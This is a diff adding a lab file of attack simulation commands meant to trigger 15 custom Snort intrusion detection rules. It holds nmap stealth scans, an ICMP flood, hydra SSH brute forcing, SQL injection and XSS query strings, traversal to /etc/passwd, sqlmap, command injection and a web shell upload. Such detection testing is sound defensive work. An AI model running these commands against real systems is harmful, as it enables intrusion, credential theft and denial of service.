@@ -1,0 +1,85 @@
+SNORT NIDS – ATTACK SIMULATION COMMANDS
+(Aligned with 15 Custom Snort Rules)
+
+Note:
+All commands were executed in a controlled virtual lab environment
+for educational and defensive security testing purposes only.
+
+Attacker Machine : Kali Linux
+Victim Machine   : Ubuntu Desktop (Snort Installed)
+
+--------------------------------------------------
+RULE 1: TCP SYN Scan Detection
+--------------------------------------------------
+sudo nmap -sS -Pn <victim-ip>
+
+--------------------------------------------------
+RULE 2: TCP FIN Scan Detection
+--------------------------------------------------
+sudo nmap -sF <victim-ip>
+
+--------------------------------------------------
+RULE 3: TCP Xmas Scan Detection
+--------------------------------------------------
+sudo nmap -sX <victim-ip>
+
+--------------------------------------------------
+RULE 4: ICMP Detection (Ping / Flood)
+--------------------------------------------------
+ping <victim-ip>
+sudo nping --icmp --rate 100 --count 0 <victim-ip>
+
+--------------------------------------------------
+RULE 5: SSH Login Attempt Detection
+--------------------------------------------------
+ssh user@<victim-ip>
+
+--------------------------------------------------
+RULE 6: SSH Brute Force Attempt Detection
+--------------------------------------------------
+hydra -l user -P passwords.txt ssh://<victim-ip>
+
+--------------------------------------------------
+RULE 7: Telnet Connection Attempt Detection
+--------------------------------------------------
+telnet <victim-ip> 23
+
+--------------------------------------------------
+RULE 8: FTP Connection Attempt Detection
+--------------------------------------------------
+ftp <victim-ip>
+
+--------------------------------------------------
+RULE 9: SQL Injection Detection
+--------------------------------------------------
+curl "http://<victim-ip>/login.php?username=admin%27%20OR%201%3D1--&password=test"
+
+--------------------------------------------------
+RULE 10: Directory Traversal Detection
+--------------------------------------------------
+curl "http://<victim-ip>/../../../../etc/passwd"
+
+--------------------------------------------------
+RULE 11: Sensitive File Access Detection (.git)
+--------------------------------------------------
+curl "http://<victim-ip>/.git/"
+
+--------------------------------------------------
+RULE 12: SQL Scanning Detection (SQLMap)
+--------------------------------------------------
+sqlmap -u "http://<victim-ip>/login.php?username=test&password=test" --batch
+
+--------------------------------------------------
+RULE 13: Command Injection Attempt Detection
+--------------------------------------------------
+curl -X POST -d "cmd=whoami" http://<victim-ip>/command.php
+
+--------------------------------------------------
+RULE 14: Cross-Site Scripting (XSS) Detection
+--------------------------------------------------
+curl "http://<victim-ip>/comment.php?msg=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+
+--------------------------------------------------
+RULE 15: Malicious File Upload Detection
+--------------------------------------------------
+curl -F "file=@shell.php" http://<victim-ip>/upload.php
